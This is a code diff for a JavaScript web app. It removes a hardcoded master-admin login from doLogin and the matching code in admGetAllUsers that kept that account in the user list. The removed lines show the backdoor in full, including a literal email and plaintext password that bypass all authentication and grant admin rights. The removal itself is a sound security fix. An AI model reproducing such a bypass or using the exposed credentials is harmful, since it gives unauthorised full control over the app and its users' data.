@@ -4758,25 +4758,6 @@ function doLogin(){
   if (!email || !pass) { showAlert(errEl,'Please fill in all fields.'); return; }
   if (btn) { btn.disabled = true; btn.textContent = 'Signing in...'; }
 
-  // ── MASTER ADMIN ACCOUNT (always works, bypasses all auth) ────────
-  if (email === 'japhethjev@gmail.com' && pass === 'admintor1984') {
-    var adminUser = {
-      id:'admin_master', name:'Admin', email:'japhethjev@gmail.com',
-      plan:'enterprise', isAdmin:true, createdAt:'2026-01-01T00:00:00.000Z'
-    };
-    var users = getUsers();
-    if (!users.find(function(u){ return u.id==='admin_master'; })) {
-      users.unshift(adminUser); saveUsers(users);
-    }
-    saveSession(adminUser);
-    currentUser = adminUser;
-    if (btn) { btn.disabled = false; btn.textContent = 'Sign In'; }
-    admLog('Admin logged in','info');
-    showPage('dashboard');
-    return;
-  }
-  // ─────────────────────────────────────────────────────────────────
-
   // ── SUPABASE AUTH (when configured) ──────────────────────────────
   var sb = getSupabase();
   if (sb) {
@@ -10771,11 +10752,6 @@ function getLogs() {
 // ── ADMIN DATA AGGREGATION ────────────────────────────────────────────
 function admGetAllUsers() {
   var users = getUsers();
-  // Ensure master admin is included
-  if (!users.find(function(u){ return u.email === 'japhethjev@gmail.com'; })) {
-    users.unshift({ id:'admin_master', name:'Admin', email:'japhethjev@gmail.com',
-                    plan:'enterprise', isAdmin:true, createdAt:'2026-01-01T00:00:00.000Z' });
-  }
   return users;
 }
 
